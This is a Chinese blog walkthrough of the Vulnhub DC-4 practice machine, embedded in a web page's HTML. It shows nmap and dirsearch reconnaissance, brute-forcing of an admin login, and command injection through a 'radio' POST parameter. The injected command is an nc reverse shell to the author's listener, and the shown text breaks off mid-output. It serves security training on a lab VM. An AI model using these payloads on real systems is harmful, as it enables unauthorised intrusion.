<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="DC-4

 https://www.vulnhub.com/entry/dc-4,313/
 

主机发现端口扫描

1. 探测存活主机，`173`是靶机
    
    
    
2. 扫描靶机所有开放端口
    
    
    
3. 扫描服务版本及系统版本
    
    
    
4. 扫描漏洞
    
    
    

web渗透

1. 访问页面，显示`Admin..." data-next-head=""/><meta property="og:title" content="Vulnhub - DC-4" data-next-head=""/><meta property="og:description" content="DC-4

 https://www.vulnhub.com/entry/dc-4,313/
 

主机发现端口扫描

1. 探测存活主机，`173`是靶机
    
    
    
2. 扫描靶机所有开放端口
    
    
    
3. 扫描服务版本及系统版本
    
    
    
4. 扫描漏洞
    
    
    

web渗透

1. 访问页面，显示`Admin..." data-next-head=""/><meta property="og:url" content="https://sunsetaction.top/2025/04/02/VulnhubDC-4" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-04-02" data-next-head=""/><meta property="article:modified_time" content="2025-04-02" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="Vulnhub" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Vulnhub - DC-4" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top/2025/04/02/VulnhubDC-4" data-next-head=""/><title data-next-head="">Vulnhub - DC-4</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/951-ad0cb56524ddaaf1.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-cfd5476bab53b42b.js" defer=""></script><script src="/_next/static/-UtzH07gHiBcLmgvXOgKo/_buildManifest.js" defer=""></script><script src="/_next/static/-UtzH07gHiBcLmgvXOgKo/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400">Vulnhub - DC-4</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-04-02</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-04-02<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Vulnhub</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"VulnhubDC-4","contentHtml":"\u003ch1\u003eDC-4\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.vulnhub.com/entry/dc-4,313/\"\u003ehttps://www.vulnhub.com/entry/dc-4,313/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e主机发现端口扫描\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e探测存活主机，\u003ccode\u003e173\u003c/code\u003e是靶机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e                      \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-01 15:33 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.1\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00018\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:C0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.2\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00017\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FB:CA:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.173\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00054\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e61\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.254\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00022\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:E0:C9:\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003eA (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.151\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描靶机所有开放端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.173\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-01 15:34 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.173\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.0011\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (conn-refused)\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e61\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描服务版本及系统版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sV -sT -O -p80,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.173\u003c/span\u003e \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-01 15:36 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.173\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.0010\u003c/span\u003es latency).\n\nPORT   STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e7.4\u003c/span\u003ep1 Debian \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e+\u003cspan class=\"hljs-title function_ invoke__\"\u003edeb9u6\u003c/span\u003e (protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http    nginx \u003cspan class=\"hljs-number\"\u003e1.15\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e61\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e (VMware)\nWarning: OSScan results may be unreliable because we could not find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e open \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice type: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e.X|\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e.X\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e3.2\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e4.9\u003c/span\u003e\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -script=vuln -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-01 \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00030\u003c/span\u003es latency).\n\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\n| http-csrf: \n| Spidering limited to: maxdepth=\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e; maxpagecount=\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e; withinhost=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/\n|     Form \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e: \n|     Form action: login.php\n|     \n|     Path: http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/login.php\n|     Form \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e: \n|_    Form action: login.php\n|_http-dombased-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any DOM based XSS.\n|_http-stored-xss: Couldn'\u003c/span\u003et find \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e stored XSS vulnerabilities.\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0C:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:01:\u003cspan class=\"hljs-number\"\u003e61\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eweb渗透\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e访问页面，显示**\u003ccode\u003eAdmin Information Systems Login\u003c/code\u003e**\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDC-4/image27.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描目录，也没发现\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edirsearch -u \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e -x \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e\n//\n[\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e] Starting:\n[\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e -  704B  - /command.php  -\u003e  index.php\n[\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e55\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  170B  - /css  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e/css/\n[\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e:02] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  170B  - /images  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e/images/\n[\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e:06] \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e -  206B  - /login.php  -\u003e  index.php\n[\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e:07] \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e -  163B  - /logout.php  -\u003e  index.php\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试了\u003ccode\u003esql\u003c/code\u003e注入也没效果，尝试暴力破解\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e用户名是\u003ccode\u003eadmin\u003c/code\u003e，爆破密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDC-4/image28.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehappy\u003c/code\u003e的时候长度明显不一样，密码应该就是\u003ccode\u003ehappy\u003c/code\u003e了\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e成功登陆进去，点击\u003ccode\u003erun\u003c/code\u003e会执行查看当前目录文件，执行的命令是\u003ccode\u003els -l\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDC-4/image29.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e当我们不知道命令是怎么控制的，抓包看看\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ePOST /command.php HTTP/\u003cspan class=\"hljs-number\"\u003e1.1\u003c/span\u003e\nHost: \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e\nUser-Agent: Mozilla/\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e (Windows NT \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e; Win64; x64; rv:\u003cspan class=\"hljs-number\"\u003e132.0\u003c/span\u003e) Gecko/\u003cspan class=\"hljs-number\"\u003e20100101\u003c/span\u003e Firefox/\u003cspan class=\"hljs-number\"\u003e132.0\u003c/span\u003e\nAccept: text/html,application/xhtml+xml,application/xml;q=\u003cspan class=\"hljs-number\"\u003e0.9\u003c/span\u003e,*/*;q=\u003cspan class=\"hljs-number\"\u003e0.8\u003c/span\u003e\nAccept-Language: zh-CN,zh;q=\u003cspan class=\"hljs-number\"\u003e0.8\u003c/span\u003e,zh-TW;q=\u003cspan class=\"hljs-number\"\u003e0.7\u003c/span\u003e,zh-HK;q=\u003cspan class=\"hljs-number\"\u003e0.5\u003c/span\u003e,en-US;q=\u003cspan class=\"hljs-number\"\u003e0.3\u003c/span\u003e,en;q=\u003cspan class=\"hljs-number\"\u003e0.2\u003c/span\u003e\nAccept-Encoding: gzip, deflate, br\nContent-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e: application/x-www-form-urlencoded\nContent-Length: \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e\nOrigin: http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e\nSec-GPC: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nConnection: keep-alive\nReferer: http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e/command.php\nCookie: PHPSESSID=18ugmlkd6apve37kqclfdj4100\nUpgrade-Insecure-Requests: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nPriority: u=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, i\n\nradio=ls+-l\u0026#x26;submit=Run\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e原来是在数据包参数\u003ccode\u003eradio\u003c/code\u003e规定执行的命令，我们直接输入反弹\u003ccode\u003eshell\u003c/code\u003e命令，kali同时开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eradio=nc \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e -e /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash\u0026#x26;submit=Run\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得shell\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003elistening on [\u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e: inverse host lookup failed: Unknown host\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e (UNKNOWN) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e] \u003cspan 